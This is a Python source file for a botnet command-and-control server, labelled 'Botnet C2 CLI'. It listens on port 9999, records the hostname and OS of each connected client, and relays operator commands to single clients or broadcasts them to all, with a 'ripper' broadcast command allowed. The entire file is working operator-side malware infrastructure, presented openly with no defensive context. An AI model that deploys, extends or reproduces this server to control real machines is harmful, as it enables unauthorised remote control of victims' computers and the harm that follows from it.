import socket
import threading
import os
import json
from colorama import init, Fore, Style
import pyfiglet

clients = {}  # client_id: { "socket": ..., "info": {...} }
client_id_counter = 0
lock = threading.Lock()
ALLOWED_BROADCAST_COMMANDS = ["ripper"]
shutdown_flag = threading.Event()
reusable_ids = []  # Pool of freed client IDs

# === Client Handler ===
def handle_client(sock, addr, cid):
    print(Fore.BLUE + f"\n[+] Connection from {addr} (ID: {cid})" + Style.RESET_ALL)
    print(Fore.CYAN + "\n[C2] >" + Style.RESET_ALL)
    with lock:
        clients[cid] = {"socket": sock, "info": {}}

    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            msg = data.decode(errors='ignore').strip()
            if msg.startswith("[SYSINFO]"):
                try:
                    info_json = msg[len("[SYSINFO] "):].strip()
                    info = json.loads(info_json)
                    clients[cid]["info"] = info
                    print(Fore.GREEN + f"\n[+] Client {cid} info received: {info}" + Style.RESET_ALL)
                except Exception as e:
                    print(Fore.RED + f"\n[!] Failed to parse system info from client {cid}: {e}" + Style.RESET_ALL)
            else:
                print(Fore.WHITE + f"\n[CLIENT {cid}]\n{msg}" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"\n[!] Error with client {cid}: {e}" + Style.RESET_ALL)
    finally:
        with lock:
            clients.pop(cid, None)
            reusable_ids.append(cid)  # Reuse this client ID for future clients
        sock.close()
        print(Fore.YELLOW + f"\n[-] Client {cid} disconnected" + Style.RESET_ALL)

# === Connection Listener ===
def accept_connections(server_sock):
    global client_id_counter
    while not shutdown_flag.is_set():
        try:
            sock, addr = server_sock.accept()
        except OSError:
            # Socket closed, exit thread
            break
        except Exception as e:
            print(Fore.RED + f"\n[!] Accept error: {e}" + Style.RESET_ALL)
            continue
        with lock:
            if reusable_ids:
                cid = reusable_ids.pop(0)  # Reuse freed ID
            else:
                cid = client_id_counter
                client_id_counter += 1
        threading.Thread(target=handle_client, args=(sock, addr, cid), daemon=True).start()

# === Command Console ===
def command_loop():
    while True:
        cmd = input("\n[C2] > ").strip()

        if cmd == "list":
            with lock:
                if not clients:
                    print("\n[*] No clients connected.")
                else:
                    for cid, client in clients.items():
                        info = client.get("info", {})
                        hostname = info.get("hostname", "Unknown")
                        os_name = info.get("os", "Unknown")
                        print(f"\nClient ID: {cid} | Hostname: {hostname} | OS: {os_name}")
                        # Request system info if missing
                        if hostname == "Unknown" or os_name == "Unknown":
                            try:
                                client_sock = client.get("socket")
                                if client_sock:
                                    client_sock.send(b"system info\n")
                            except Exception as e:
                                print(f"\n[!] Failed to request system info from client {cid}: {e}")

        elif cmd.startswith("send"):
            parts = cmd.split()
            if len(parts) < 3:
                print("\n[!] Usage: send <client_id|*> <command>")
                continue

            target, command = parts[1], " ".join(parts[2:])

            if target == "*":
                base_command = parts[2].lower()
                if base_command not in ALLOWED_BROADCAST_COMMANDS:
                    print(f"\n[!] Broadcast '{base_command}' not allowed.")
                    continue
                with lock:
                    for cid, client in clients.items():
                        try:
                            client_sock = client.get("socket")
                            if client_sock:
                                # Send command with newline
                                client_sock.send((command + "\n").encode())
                                print(f"\n[*] Sent to client {cid}")
                        except Exception as e:
                            print(f"\n[!] Failed to send to {cid}: {e}")
            else:
                try:
                    cid = int(target)
                    with lock:
                        client = clients.get(cid)
                    if client:
                        client_sock = client.get("socket")
                        if client_sock:
                            # Send command with newline
                            client_sock.send((command + "\n").encode())
                            print(f"\n[*] Sent to client {cid}")
                        else:
                            print("\n[!] Invalid client socket")
                    else:
                        print("\n[!] Invalid client ID")
                except ValueError:
                    print("\n[!] Client ID must be an integer or *")

        elif cmd == "clear":
            os.system("cls" if os.name == "nt" else "clear")

        elif cmd == "help":
            print("\nCommands:")
            print("  list                         - List connected clients")
            print("  send <id|*> <command>        - Send command to client or all")
            print("  clear                        - Clear console")
            print("  help                         - Show this help")
            print("  exit                         - Shutdown server\n")

        elif cmd == "exit":
            print(Fore.RED + "\n[C2] Server shutting down." + Style.RESET_ALL)
            shutdown_flag.set()
            break

        else:
            print("\n[!] Unknown command. Type 'help' for options")

# === Main Server ===
def print_banner():
    init(autoreset=True)
    banner = pyfiglet.figlet_format("C2 SERVER", font="slant")
    print(Fore.CYAN + banner)
    print(Fore.YELLOW + Style.BRIGHT + "Welcome to the Botnet C2 CLI!\n" + Style.RESET_ALL)
    print(Fore.GREEN + "Type 'help' to see available commands.\n" + Style.RESET_ALL)

def main():
    print_banner()
    host, port = "0.0.0.0", 9999
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(Fore.MAGENTA + f"\n[C2] Listening on {host}:{port}" + Style.RESET_ALL)

    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,), daemon=True)
    accept_thread.start()
    command_loop()
    server_socket.close()
    accept_thread.join()
    print(Fore.YELLOW + "\n[+] Server socket closed. Goodbye!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
